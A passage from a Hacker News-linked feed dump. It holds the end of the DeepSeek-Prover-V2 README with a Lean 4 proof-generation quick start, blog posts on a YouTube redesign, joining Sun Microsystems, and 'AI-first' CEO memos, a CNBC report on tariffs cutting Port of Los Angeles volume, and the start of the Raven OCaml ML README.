<p dir="auto"><h2 tabindex="-1" dir="auto">4. Model &amp; Dataset Downloads</h2><a id="user-content-4-model--dataset-downloads" aria-label="Permalink: 4. Model &amp; Dataset Downloads" href="#4-model--dataset-downloads"></a></p>
<p dir="auto">We release DeepSeek-Prover-V2 in two model sizes: 7B and 671B parameters. DeepSeek-Prover-V2-671B is trained on top of DeepSeek-V3-Base. DeepSeek-Prover-V2-7B is built upon DeepSeek-Prover-V1.5-Base and features an extended context length of up to 32K tokens.</p>


<p dir="auto"><h2 tabindex="-1" dir="auto">5. Quick Start</h2><a id="user-content-5-quick-start" aria-label="Permalink: 5. Quick Start" href="#5-quick-start"></a></p>
<p dir="auto">You can directly use <a href="https://github.com/huggingface/transformers">Huggingface's Transformers</a> for model inference. DeepSeek-Prover-V2-671B shares the same architecture as DeepSeek-V3. For detailed information and supported features, please refer to <a href="https://github.com/huggingface/transformers/blob/main/docs/source/en/model_doc/deepseek_v3.md">the DeepSeek-V3 documentation on Hugging Face</a>.</p>
<p dir="auto">The following is a basic example of generating a proof for a problem from the miniF2F dataset:</p>
<div dir="auto" data-snippet-clipboard-copy-content="from transformers import AutoModelForCausalLM, AutoTokenizer
import torch
torch.manual_seed(30)

model_id = &quot;DeepSeek-Prover-V2-7B&quot;  # or DeepSeek-Prover-V2-671B
tokenizer = AutoTokenizer.from_pretrained(model_id)

formal_statement = &quot;&quot;&quot;
import Mathlib
import Aesop

set_option maxHeartbeats 0

open BigOperators Real Nat Topology Rat

/-- What is the positive difference between $120\%$ of 30 and $130\%$ of 20? Show that it is 10.-/
theorem mathd_algebra_10 : abs ((120 : ℝ) / 100 * 30 - 130 / 100 * 20) = 10 := by
  sorry
&quot;&quot;&quot;.strip()

prompt = &quot;&quot;&quot;
Complete the following Lean 4 code:

```lean4
{}
```

Before producing the Lean 4 code to formally prove the given theorem, provide a detailed proof plan outlining the main proof steps and strategies.
The plan should highlight key ideas, intermediate lemmas, and proof structures that will guide the construction of the final formal proof.
&quot;&quot;&quot;.strip()

chat = [
  {&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: prompt.format(formal_statement)},
]

model = AutoModelForCausalLM.from_pretrained(model_id, device_map=&quot;auto&quot;, torch_dtype=torch.bfloat16, trust_remote_code=True)
inputs = tokenizer.apply_chat_template(chat, tokenize=True, add_generation_prompt=True, return_tensors=&quot;pt&quot;).to(model.device)

import time
start = time.time()
outputs = model.generate(inputs, max_new_tokens=8192)
print(tokenizer.batch_decode(outputs))
print(time.time() - start)"><pre><span>from</span> <span>transformers</span> <span>import</span> <span>AutoModelForCausalLM</span>, <span>AutoTokenizer</span>
<span>import</span> <span>torch</span>
<span>torch</span>.<span>manual_seed</span>(<span>30</span>)

<span>model_id</span> <span>=</span> <span>"DeepSeek-Prover-V2-7B"</span>  <span># or DeepSeek-Prover-V2-671B</span>
<span>tokenizer</span> <span>=</span> <span>AutoTokenizer</span>.<span>from_pretrained</span>(<span>model_id</span>)

<span>formal_statement</span> <span>=</span> <span>"""</span>
<span>import Mathlib</span>
<span>import Aesop</span>
<span></span>
<span>set_option maxHeartbeats 0</span>
<span></span>
<span>open BigOperators Real Nat Topology Rat</span>
<span></span>
<span>/-- What is the positive difference between $120\%$ of 30 and $130\%$ of 20? Show that it is 10.-/</span>
<span>theorem mathd_algebra_10 : abs ((120 : ℝ) / 100 * 30 - 130 / 100 * 20) = 10 := by</span>
<span>  sorry</span>
<span>"""</span>.<span>strip</span>()

<span>prompt</span> <span>=</span> <span>"""</span>
<span>Complete the following Lean 4 code:</span>
<span></span>
<span>```lean4</span>
<span>{}</span>
<span>```</span>
<span></span>
<span>Before producing the Lean 4 code to formally prove the given theorem, provide a detailed proof plan outlining the main proof steps and strategies.</span>
<span>The plan should highlight key ideas, intermediate lemmas, and proof structures that will guide the construction of the final formal proof.</span>
<span>"""</span>.<span>strip</span>()

<span>chat</span> <span>=</span> [
  {<span>"role"</span>: <span>"user"</span>, <span>"content"</span>: <span>prompt</span>.<span>format</span>(<span>formal_statement</span>)},
]

<span>model</span> <span>=</span> <span>AutoModelForCausalLM</span>.<span>from_pretrained</span>(<span>model_id</span>, <span>device_map</span><span>=</span><span>"auto"</span>, <span>torch_dtype</span><span>=</span><span>torch</span>.<span>bfloat16</span>, <span>trust_remote_code</span><span>=</span><span>True</span>)
<span>inputs</span> <span>=</span> <span>tokenizer</span>.<span>apply_chat_template</span>(<span>chat</span>, <span>tokenize</span><span>=</span><span>True</span>, <span>add_generation_prompt</span><span>=</span><span>True</span>, <span>return_tensors</span><span>=</span><span>"pt"</span>).<span>to</span>(<span>model</span>.<span>device</span>)

<span>import</span> <span>time</span>
<span>start</span> <span>=</span> <span>time</span>.<span>time</span>()
<span>outputs</span> <span>=</span> <span>model</span>.<span>generate</span>(<span>inputs</span>, <span>max_new_tokens</span><span>=</span><span>8192</span>)
<span>print</span>(<span>tokenizer</span>.<span>batch_decode</span>(<span>outputs</span>))
<span>print</span>(<span>time</span>.<span>time</span>() <span>-</span> <span>start</span>)</pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">6. License</h2><a id="user-content-6-license" aria-label="Permalink: 6. License" href="#6-license"></a></p>
<p dir="auto">The use of DeepSeek-Prover-V2 models is subject to <a href="https://github.com/deepseek-ai/DeepSeek-Prover-V2/blob/main/LICENSE-MODEL">the Model License</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">7. Contact</h2><a id="user-content-7-contact" aria-label="Permalink: 7. Contact" href="#7-contact"></a></p>
<p dir="auto">If you have any questions, please raise an issue or contact us at <a href="mailto:service@deepseek.com">service@deepseek.com</a>.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Someone at YouTube Needs Glasses (996 pts)]]></title>
            <link>https://jayd.ml/2025/04/30/someone-at-youtube-needs-glasses.html</link>
            <guid>43846487</guid>
            <pubDate>Wed, 30 Apr 2025 15:18:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jayd.ml/2025/04/30/someone-at-youtube-needs-glasses.html">https://jayd.ml/2025/04/30/someone-at-youtube-needs-glasses.html</a>, See on <a href="https://news.ycombinator.com/item?id=43846487">Hacker News</a></p>
<div id="readability-page-1" class="page"><div aria-label="Content">
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Opened YouTube and was greeted with this abomination:</p>

<p><img src="https://jayd.ml/assets/posts/2025-04-30-someone-at-youtube-needs-glasses/abomination.png"></p>

<p>This is on a 32” 1440p display. There are five (5) videos visible, and 1/6 of 
the page would have been an enormous ad.</p>

<p>For reference, here is YouTube as of January 2019:</p>

<p><img src="https://jayd.ml/assets/posts/2025-04-30-someone-at-youtube-needs-glasses/old.png"></p>

<p>There are 30 videos visible and zero ads.</p>

<p>I really, really hope that this A/B test fails.</p>

<p>Unfortunately, using an advanced analytics package I’ve projected that around
May 2026 the YouTube homepage will just be one video, and by September there 
will be no videos at all on the homepage.</p>

<p><img src="https://jayd.ml/assets/posts/2025-04-30-someone-at-youtube-needs-glasses/projection.png"></p>

<p>Presumably by then we’ll have our mandatory NeuraLinks and the YouTube algorithm
will be able to inject real-time ML generated content (and ads) straight into 
our brains, tuning its output as needed to maximize our dopamine response.</p>

<p>I miss YouTube before they turned the pain dial all the way towards money.</p>

  </div>
</article>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Joining Sun Microsystems – 40 years ago (2022) (163 pts)]]></title>
            <link>https://akapugs.blog/2022/05/03/674/</link>
            <guid>43846187</guid>
            <pubDate>Wed, 30 Apr 2025 14:57:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://akapugs.blog/2022/05/03/674/">https://akapugs.blog/2022/05/03/674/</a>, See on <a href="https://news.ycombinator.com/item?id=43846187">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="post-674">
			<!-- .entry-header -->		<!-- .entry-meta -->
	
	<div dir="auto">
<p>40 years ago today:  I joined a tiny startup called Sun Microsystems. What a ride! Here’s the never-before-told story of how I arrived at Sun as employee #8! 🧵 <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qRpDXwAETXI_.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qRpDXwAETXI_.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>I started out in Silicon Valley in June of 1978 working at Amdahl Corp. porting UNIX to the mainframe, a revival of the work started at Princeton in 1975. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qSypXMAI9PX3.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qSypXMAI9PX3.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>Sometime in late ’80 I moved over to Amdahl’s architecture group to work on data communications – X.25, SNA, etc.  But that work wasn’t too satisfying. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qTZrXEAMeNEv.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qTZrXEAMeNEv.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>During the UNIX/UTS work I had been up to Berkeley a few times to see talks by Bill Joy and others about BSD UNIX (I think I was the first person to implement the select system call, though it never made it to product). Anyways, I guess Bill remembered me. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qTuLXIAQXgNR.png?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qTuLXIAQXgNR.png?w=1100&amp;ssl=1"></a></span></p>
<p>There was *intense* startup fever in the Silicon Valley in 81/82. I  was caught up in it and actively looking for a startup – I even bought books and magazines about starting companies. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qUC3XIAYBjMv.png?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qUC3XIAYBjMv.png?w=1100&amp;ssl=1"></a></span></p>
<p>🔥🔥🔥 At that time UNIX and Motorola 68000 were HOT technologies 🔥🔥🔥 – there were literally (yes, truly) 100 startup companies doing something with the combination.</p>
<p>Most of the well-funded ones were building time-shared minicomputers to attack DEC – Altos Computer Systems was a prime example. There were a bunch of bottom feeders targeting the home-brew market, and then there were a few with real differentiation. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qUixXwAEsSde.png?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qUixXwAEsSde.png?w=1100&amp;ssl=1"></a></span></p>
<p>I had talked with Valid Logic Systems, who were building a CAD workstation. Good people, but CAD was not my thing so I didn’t have any feeling about the business. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qVYGWUAQnm53.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qVYGWUAQnm53.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>I also talked with Fortune Systems. John Bass, pretty well known in the UNIX world, was there and trying to get me. Fortune was very well funded and going after the Wang word processing market. I still have never seen a Wang system in person, so that was not my bag either. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qVwkWQAUcsNB.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qVwkWQAUcsNB.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>But let’s talk about my unfair advantage – my Lyon family mafia. I was living with my brother Bob and his wife. Bob was working at Xerox SDD developing the Xerox Star workstation. And my brother Dick was at Xerox PARC with an Alto on his desk! So I knew workstations. <span><span><span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qWKUXoAIa9Gb.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qWKUXoAIa9Gb.jpg?w=1100&amp;ssl=1"></a></span></span><span><span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qWLyXsAAiAsP.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qWLyXsAAiAsP.jpg?w=1100&amp;ssl=1"></a></span></span></span></p>
<p>Bob had a friend from SDD, Glenn, who would come over to our house to shoot the breeze; and he started raving one time about the SUN project at Stanford and about how cool the processor board was, and how we should all buy one if we could (for homebrew hacking). <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qW6GXwAEyWNe.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qW6GXwAEyWNe.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>So I knew about SUN. One day Scott McNealy called me out of the blue, having found me at Amdahl. He said he was with a company called Sun Microsystems. I responded “Oh! Are you doing something with the SUN board?”  He was NOT expecting that. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qXRVXMAAjPnZ.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qXRVXMAAjPnZ.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>So I went for an interview and met Scott, Andy Bechtolsheim, and Vinod Khosla. That’s when they told me that they had landed Bill Joy – and that was who gave Scott my name (on a list with 20+ others). The combination of UNIX, workstations, and Bill Joy sealed the deal for me. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qXk6WUAI1alB.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qXk6WUAI1alB.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>My bit of diligence was to check with my brother Dick about Andy B.  Andy had interned with Xerox PARC while developing the SUN 3Mb Ethernet card. Dick assured me he had a good reputation. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qX5IXwAI9pbH.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qX5IXwAI9pbH.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>So I got an offer letter from Vinod. When talking to him about it, I pushed a little on the stock option number. He reacted viscerally with “That’s a good number!”  I think others had already moved him to a higher amount. Anyways, I was a push-over. I accepted. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qYO3XwAI76Nx.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qYO3XwAI76Nx.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>When I told my brother Bob, he was rather distressed. We were just managing a house mortgage with 3 full time incomes. Interest rates then were well above 10%. But no worries; a year later he was at Sun too. <span><video autoplay="" muted="" loop="" controls="" poster="https://pbs.twimg.com/tweet_video_thumb/FR1qY7WXEAA0sqL.jpg"><source src="https://video.twimg.com/tweet_video/FR1qY7WXEAA0sqL.mp4" type="video/mp4"><img data-recalc-dims="1" decoding="async" alt="Video Poster" src="https://i0.wp.com/pbs.twimg.com/tweet_video_thumb/FR1qY7WXEAA0sqL.jpg?w=1100&amp;ssl=1"></video></span></p>
<p>I started on May 3. Bruce Smith, employee #9, started the same day. We each followed the other around for a while thinking they had been there already. The office was at 2310 Walsh in Santa Clara, across from today’s Nvidia campus. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qaOPX0AIoST_.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qaOPX0AIoST_.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>Bill Shannon(RIP) started a couple of weeks later with lots of BSD UNIX experience already, and together we were the fearsome kernel team. His fun title was “virtual memory manager” and mine was “director of devices” <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qatDWQAQWMCD.png?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qatDWQAQWMCD.png?w=1100&amp;ssl=1"></a></span></p>
<p>My first success at Sun was in debugging a disk driver in UNISOFT UNIX (a V7 port for the 68K). The bug would scramble the disk whenever swapping started. With the fix, we could ship UNIX with Sun-1s. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qbPSX0AIIx7C.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qbPSX0AIIx7C.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>A year after I started, Sun was a whole lot of great people with new buildings in Mountain View, shipping zillions of workstations with BSD UNIX, 68010s, and 10Mb Ethernet. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qb35X0AQpV6i.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qb35X0AQpV6i.jpg?w=1100&amp;ssl=1"></a></span></p>
<p>I am eternally grateful for the opportunity to have been part of the Sun Microsystems phenomenon. <span><a href="https://i0.wp.com/pbs.twimg.com/media/FR1qcUmWYAk4iUk.jpg?ssl=1" target="_blank" rel="noopener"><img data-recalc-dims="1" decoding="async" src="https://i0.wp.com/pbs.twimg.com/media/FR1qcUmWYAk4iUk.jpg?w=1100&amp;ssl=1"></a></span></p>
</div><!-- .entry-content -->

	<!-- .entry-footer -->

	<div>
				<!-- .entry-auhtor -->
				<p><strong>Published</strong>
			<time datetime="2022-05-03T01:33:00+00:00">May 3, 2022</time><time datetime="2022-05-23T02:01:20+00:00">May 23, 2022</time>		</p><!-- .site-posted-on -->
	</div>
</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA["AI-first" is the new Return To Office (295 pts)]]></title>
            <link>https://www.anildash.com//2025/04/19/ai-first-is-the-new-return-to-office/</link>
            <guid>43845089</guid>
            <pubDate>Wed, 30 Apr 2025 13:38:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.anildash.com//2025/04/19/ai-first-is-the-new-return-to-office/">https://www.anildash.com//2025/04/19/ai-first-is-the-new-return-to-office/</a>, See on <a href="https://news.ycombinator.com/item?id=43845089">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <p>The latest fad amongst tech CEOs is no longer "founder mode", or taking drugs that they would fire you for taking, or telling everybody to return to the office — it's demanding that all work be AI-first! This is a great idea if you think nobody at your company is great at what they do. It may otherwise be a suboptimal strategy. Let's dive in!</p>
<p>Let's use me as a case study. I'm pretty okay at writing. For example, one time I <a href="https://www.anildash.com/2015/07/11/the_internet_of_tweets/">wrote a fairly technical analysis</a> of Twitter's platform strategy that inspired Will.I.Am of the Black Eyed Peas to start Twitter beef with me two years later when he read the post and took offense to my referring to him as "nobody’s favorite rapper".</p>
<p>This is something your GPTs cannot do, I assure you. An average LLM won't even know that Drake's favorite MIME type is <code>application/pdf</code>. Chalk one up for the greatness of human creativity.</p>
<h2>The AI-First Mind Virus</h2>
<p>Shopify's CEO Tobi Lütke (personal motto: "what if a Canadian was all the worst things about the United States?") started the "AI-first" trend, with <a href="https://www.theverge.com/news/644943/shopify-ceo-memo-ai-hires-job">one of those big memos</a> that included, amongst other things, the declaration that "We will add Al usage questions to our performance and peer review questionnaire." This is unusual — did your boss ever have to send you a memo demanding that you use a smartphone? Was there a performance review requiring you to use Slack? I'm actually old enough that I was at different workplaces when they started using spreadsheets and email and the web, and I can tell you, they absolutely didn't have to drive adoption by making people fill out paperwork about how they were definitely using the cool new technology. Isn't that interesting?</p>
<p>Some of the other CEOs talking about the use of AI are a little more reasonable. Duolingo's CEO Luis von Ahn seems to be trying to be <em>somewhat</em> more moderate in <a href="https://www.linkedin.com/feed/update/urn:li:activity:7322560534824865792/">his memo</a>, stating plainly that he doesn't see AI replacing his employees. (Though that does immediately raise the "who brought that up?" question...) Yet even in this more even-handed take, we still get the insistence that "Al use will be part of what we evaluate in performance reviews". This is really weird!</p>
<p>The funny thing is, I'm not saying LLMs are without their uses. Let's use me as a case study again. I'm a lousy coder, these days. I haven't had time to keep up my skills, and the area I focused on for most of my dev career (front end web development) changes particularly quickly. So I use some of the modern tools to help me get up to speed and get more done in a limited amount of time, because otherwise I'm woefully unproductive in the short windows I have to code in my free time.</p>
<p>To be explicit: I code on the weekends, not professionally. That means I'm not very good at it. I'm certainly <em>nothing</em> like the incredibly talented developers that I've had the good fortune to work with over the years. I'm just fluent enough to be able to debug the broken code that LLMs generate, or to catch the bugs that they spew out by default. And I'm sure I don't even catch all the bugs that pop up, but fortunately, I'm not making any production systems; I'm just building little toy apps and sites for myself.</p>
<p>This is an important illustration: AI is really good for helping you if you're bad at something, or at least below average. But it's probably not the right tool if you're great at something. So why would these CEOs be saying, almost all using the exact same phrasing, that everyone at their companies should be using these tools? Do they think their employees are all bad at their jobs?</p>
<h2>Groupthink and signaling</h2>
<p>Big tech CEOs and VCs really love performing for each other. We know they hang out in group chats like high schoolers, preening and sending each other texts, each trying to make sure they're all wearing the latest fashions, whether it's a gold chain or a MAGA hat or just repeating a phrase that they heard from another founder. A key way of showing that they're part of this cohort is to make sure they're having a tantrum and acting out against their workers fairly regularly.</p>
<p>The return to office fad was a big part of this effort, often largely motivated by reacting to the show of worker power in the racial justice activism efforts of 2020. Similarly, being AI-first shows that a company is participating in the AI trend in the "right" way, by imposing it on workers, rather than trusting workers to judge what tools are useful for them to do their jobs.</p>
<p>A more normal policy on AI at a company might be something like this:</p>
<blockquote>
<p>Our IT department has evaluated a set of LLM tools and determined that these ones meet our requirements for security, performance, data governance, reliability, manageability and integration with our workflows. We'll be doing a controlled deployment of these tools and you can choose to use them if you think they'll help you with your work; please share your feedback on whether they are helpful, and what might make them more useful for you over time. Here are the ways these AI tools meet our corporate standards for compliance with intellectual property consent, sustainability and environmental goals, and accessibility.</p>
</blockquote>
<p>This would not get you invited to the fascist VC group chat, tho!</p>
<h2>AI-Second? Third?</h2>
<p>How did we get here? What can we do? Maybe it starts by trying to just... be <em>normal</em> about technology.</p>
<p>There's an orthodoxy in tech tycoon circles that's increasingly referred to, ironically, as "tech optimism". I say "ironically", because there's nothing optimistic about it. The culture is one of deep insecurity, reacting defensively, or even lashing out aggressively, when faced with any critical conversation about new technology. That tendency is paired with a desperate and facile cheerleading of startups, ignoring the often equally interesting technologies stories that come from academia, or from mature industries, or from noncommercial and open source communities that don't get tons of media coverage, but quietly push forward innovating without the fame and fortune. By contrast, those of us who actually <em>are</em> optimistic about technology (usually because we either create it, or are in communities with those who do) are just happily moving forward, not worrying when people point out the bugs that we all ought to be fixing together.</p>
<p>We don't actually have to follow along with the narratives that tech tycoons make up for each other. We choose the tools that we use, based on the utility that they have for us. It's strange to have to say it, but... there are people picking up and adopting AI tools on their own, because they find them useful. This is true, despite the fact that there is <em>so goddamn much</em> AI hype out there, with snake oil salesman pushing their bullshit religion of magical thinking machines and overpromising that these AI tools can do tasks that they're simply not capable of performing. It's telling that the creators of so many of the AI tools don't even have enough confidence in their offerings to simply let users choose to adopt them, and are instead forcing them into users' faces in every possible corner of their apps and websites.</p>
<p>The strangest part is, the AI pushers don't have to lie about what AI can do! If, as they say, AI tools are going to get better quickly, then <em>let them do so</em> and trust that smart people will pick them up and use them. If you think your workers and colleagues are too stupid to recognize good tools that will help them do their jobs better, then... you are a bad leader and should step down. Because you've created a broken culture.</p>
<p>But I don't think the audience for these memos is really the people who work at these companies. I think the audience is the other CEOs and investors and VCs in the industry, just as it was for the other fads of the last few years. And I expect that AI will indeed be part of how we evaluate performance in the future, but mostly in that the way CEOs communicate to their teams about technologies like AI will be part of how we all evaluate their performance as leaders.</p>

  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Port of Los Angeles says shipping volume will plummet 35% next week (660 pts)]]></title>
            <link>https://www.cnbc.com/2025/04/29/port-of-los-angeles-sees-shipping-volume-down-35percent-next-week-as-tariffs-bite.html</link>
            <guid>43844708</guid>
            <pubDate>Wed, 30 Apr 2025 13:07:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cnbc.com/2025/04/29/port-of-los-angeles-sees-shipping-volume-down-35percent-next-week-as-tariffs-bite.html">https://www.cnbc.com/2025/04/29/port-of-los-angeles-sees-shipping-volume-down-35percent-next-week-as-tariffs-bite.html</a>, See on <a href="https://news.ycombinator.com/item?id=43844708">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="RegularArticle-ArticleBody-5" data-module="ArticleBody" data-test="articleBody-2" data-analytics="RegularArticle-articleBody-5-2"><div id="ArticleBody-InlineImage-108137934" data-test="InlineImage"><p>A container ship is shown at the Port of Los Angeles in Los Angeles, California, U.S. November 22, 2021. </p><p>Mike Blake | Reuters</p></div><div><p>Shipments from China to the West Coast of the U.S. will plummet next week as the impact of President <a href="https://www.cnbc.com/donald-trump/">Donald Trump</a>'s tariffs leads companies to cut their import orders.</p><p>Gene Seroka, executive director of the Port of Los Angeles, said Tuesday on <a href="https://www.cnbc.com/squawk-box-us/">CNBC's "Squawk Box</a>" that he expects incoming cargo volume to slide by more than a third next week compared with the same period in 2024.</p><p>"According to our own port optimizer, which measures the loadings in Asia, we'll be down just a little bit over 35% next week compared to last year. And it's a precipitous drop in volume with a number of major American retailers stopping all shipments from China based on the tariffs," Seroka said.</p></div><div id="Placeholder-ArticleBody-Video-108137936" data-test="VideoPlaceHolder" role="region" tabindex="0" data-vilynx-id="7000374247" aria-labelledby="Placeholder-ArticleBody-Video-108137936"><p><img src="https://image.cnbcfm.com/api/v1/image/108137937-17459285871745928584-39576606661-1080pnbcnews.jpg?v=1745928586&amp;w=750&amp;h=422&amp;vtcrop=y" alt="Port of LA's Gene Seroka on tariff impact: Retailers have about 5-7 weeks of full inventories left"><span></span><span></span></p></div><div><p>Shipments from China make up about 45% of the business for the Port of LA, though some transport companies will be looking to pick up goods at other points in Southeast Asia to try to fill up their ships, Seroka said.</p><p>"Realistically speaking, until some accord or framework can be reached with China, the volume coming out of there — save a couple of different commodities — will be very light at best," Seroka said.</p><p>Along with the lower volume of goods, Seroka said he expects roughly a quarter of the usual number of arriving ships to the port to be canceled in May.</p><p>Trump announced a sharp increase in tariffs on Chinese goods on April 2, which led to escalation on both sides, eventually resulting in both the U.S. and China imposing levies of more than 100% on many goods from each other. U.S. Treasury Secretary Scott Bessent has described the situation as "unsustainable" but there has been no sign of substantial negotiations between the two countries.</p><p>Data on shipments out of China had already started to <a href="https://www.cnbc.com/2025/04/22/busiest-us-ports-see-big-drop-in-chinese-freight-vessel-traffic.html">signal slowing trade volume</a> to the U.S., alarming some economists. Apollo Global Management's chief economist, Torsten Slok, recently laid out a timeline where lower imports from China leads to layoffs in transportation and retail industries in the U.S., empty shelves and a <a href="https://www.cnbc.com/2025/04/28/empty-shelves-trucking-layoffs-lead-to-recession-in-apollos-trade-war-timeline.html">recession this summer</a>.</p><p>Seroka said he thinks U.S. retailers have about five to seven weeks before the impact of the curtailed shipments begins to bite, partly because companies stocked up ahead of Trump's tariff announcements.</p><p>"I don't see a complete emptiness on store shelves or online when we're buying. But if you're out looking for a blue shirt, you might find 11 purple ones and one blue in a size that's not yours. So we'll start seeing less choice on those shelves simply because we're not getting the variety of goods coming in here based on the additional costs in place. And for that one blue shirt that's still left, you'll see a price hike," Seroka said.</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[U.S. Economy Contracts at 0.3% Rate in First Quarter (437 pts)]]></title>
            <link>https://www.wsj.com/economy/us-gdp-q1-2025-1f82f689</link>
            <guid>43844342</guid>
            <pubDate>Wed, 30 Apr 2025 12:38:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.wsj.com/economy/us-gdp-q1-2025-1f82f689">https://www.wsj.com/economy/us-gdp-q1-2025-1f82f689</a>, See on <a href="https://news.ycombinator.com/item?id=43844342">Hacker News</a></p>
Couldn't get https://www.wsj.com/economy/us-gdp-q1-2025-1f82f689: Error: Request failed with status code 401]]></description>
        </item>
        <item>
            <title><![CDATA[OCaml's Wings for Machine Learning (101 pts)]]></title>
            <link>https://github.com/raven-ml/raven</link>
            <guid>43844279</guid>
            <pubDate>Wed, 30 Apr 2025 12:31:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/raven-ml/raven">https://github.com/raven-ml/raven</a>, See on <a href="https://news.ycombinator.com/item?id=43844279">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Raven</h2><a id="user-content-raven" aria-label="Permalink: Raven" href="#raven"></a></p>
<p dir="auto"><strong>OCaml's Wings for Machine Learning</strong></p>
<p dir="auto">Raven is a comprehensive ecosystem of libraries, frameworks, and tools that brings machine learning and data science capabilities to OCaml.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Vision</h2><a id="user-content-vision" aria-label="Permalink: Vision" href="#vision"></a></p>
<p dir="auto">Raven aims to make training models, running data science tasks, and building pipelines in OCaml as efficient and intuitive as Python, while leveraging OCaml's inherent type safety and performance advantages. We prioritize developer experience and seamless integration.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Status</h2><a id="user-content-status" aria-label="Permalink: Status" href="#status"></a></p>
<p dir="auto">Raven is currently in <strong>pre-alpha</strong> and we're seeking user feedback:</p>
<ul dir="auto">
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/ndarray">Ndarray</a></strong> and <strong><a href="https://github.com/raven-ml/raven/blob/main/hugin">Hugin</a></strong>: Scope is feature-complete for the first alpha release, though feedback may influence refinements.</li>
